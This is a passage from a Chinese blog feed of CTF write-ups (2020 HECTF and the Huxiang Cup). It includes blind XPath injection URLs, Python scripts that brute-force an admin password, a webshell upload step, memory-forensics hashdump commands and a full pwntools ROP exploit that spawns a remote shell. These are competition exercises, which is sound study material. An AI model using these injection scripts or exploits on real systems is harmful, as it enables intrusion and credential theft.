substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p><p>猜解id为1的user节点下的username值,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: admin</p><hr><p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706" loading="lazy"><p>这个结果应该是return 1，即根下有一个节点</p><p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p><p>继续猜测第一级节点，用脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! 换成目录即可</span></code></pre><p>结果爆出第一级为root</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719" loading="lazy"><p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627" loading="lazy"><p>最后爆出结构为&#x2F;root&#x2F;users&#x2F;user[id]</p><p>开始猜测id为1的user节点下username值，其实能猜到的admin</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 爆密码就把username改成password</span></code></pre><p>爆username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104" loading="lazy"><p>果然是admin</p><p>继续爆password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953" loading="lazy"><p>结果password&#x3D;339db714647a1d66b85cd08442287841</p><p>登录一下，获得flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hxb-Writeup</title>
      <link href="article/2020hxb-Writeup-cOMING/"/>
      <url>article/2020hxb-Writeup-cOMING/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p><p>队伍名称：cOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="" loading="lazy"><p>队伍成员</p><p>gyy,Trick,hxq</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接白给phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class="" loading="lazy"><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>进网站找后台.&#x2F;admin&#x2F;<br>输入用户名密码均为admin登陆成功,html发现有&#x2F;?r&#x3D;manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class="" loading="lazy"><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class="" loading="lazy"><p>内存取证 win7： <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class="" loading="lazy"><p>MD5解出</p><p>CTF：</p><p>aad3…：空密码</p><p>0a64…:qwer1234</p><p>再结合题目：we need sha1(password)!!! sha1</p><p>解密qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class="" loading="lazy"><p>出flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>开文件发现<code>mingwen - 副本.txt</code>是伪加密,拖出来打包后明文攻击</p><p>爆破得密码：123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class="" loading="lazy"><pre class="language-none"><code class="language-none">仅需5，跳过去ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>联想栅栏加密 直接出flag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class="" loading="lazy"><h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>东西很多，最终发现这有个.html是有用的</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class="" loading="lazy"><p>打开，F12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class="" loading="lazy"><p>发现base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>解密后：</p><pre class="language-none"><code class="language-none">(｡･∀･)ﾉﾞ嗨Hi~ (＠_＠;)(＠_＠;)(＠_＠;)(+_+)?(。&gt;︿&lt;)_θ(。&gt;︿&lt;)_θo(*￣▽￣*)ブ゜＜（＾－＾）＞(╯▽╰ )好香~~ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。~\(≧▽≦)&#x2F;~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻┳━┳ ノ( ゜-゜ノ)ಠ_ಠಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(¬_¬&quot;)(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C&lt;(&#x2F;;◇;)&#x2F;~(ヘ･_･)ヘ┳━┳ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃⊙﹏⊙∥ヽ(*。&gt;Д&lt;)o゜&#x2F;(ㄒoㄒ)&#x2F;~~(#_&lt;-)（＞人＜；）(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(ﾟДﾟ*)ﾉ○|￣|_ &#x3D;3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ&lt;( ‵□′)&gt;──(⊙ˍ⊙)？(σ｀д′)σ&lt;( ‵□′)&gt;───Ｃε(┬﹏┬)3&lt;( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)(oﾟvﾟ)ノd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(￣▽￣*)bε&#x3D;ε&#x3D;ε&#x3D;(~￣▽￣)~(❤ ω ❤)U•ェ•*U(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••flag被我炸没了哈哈哈</code></pre><p>空格和base64加密的颜文字</p><p>stegsnow解出现乱码</p><p>拿颜文字的base64跑base64隐写，得到秘钥<code>lorrie</code></p><p>连到自己的服务器上nc保存文件</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class="" loading="lazy"><p><code>→_→</code>替换为<code>-</code>,<code>←_←</code>替换为<code>.</code>,去网站上解码</p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class="" loading="lazy"><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="古典美"><a href="#古典美" class="headerlink" title="古典美++"></a>古典美++</h3><p>利用网站工具得维吉尼亚密码密钥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class="" loading="lazy"><p>为<code>orderby</code> 生成MD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class="" loading="lazy"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>爆破，逐个击破。。。</p><p>easy_c++</p><p>IDA分析 一个信息</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class="" 